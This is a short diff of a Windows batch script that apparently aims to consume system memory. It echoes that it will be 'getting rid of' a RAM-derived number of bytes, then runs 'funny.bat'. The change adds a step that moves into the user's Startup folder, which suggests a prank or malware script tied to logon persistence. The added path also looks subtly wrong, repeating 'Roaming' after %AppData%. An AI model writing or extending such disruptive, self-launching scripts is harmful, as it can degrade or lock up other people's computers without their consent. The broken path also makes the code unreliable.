@@ -16,7 +16,7 @@ set /a "c=%system_ram% - 28"
 
 echo Will be getting rid of %c% bytes of memory
 
-
+cd "%AppData%/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 echo Finished!
 start funny.bat
 echo Running...
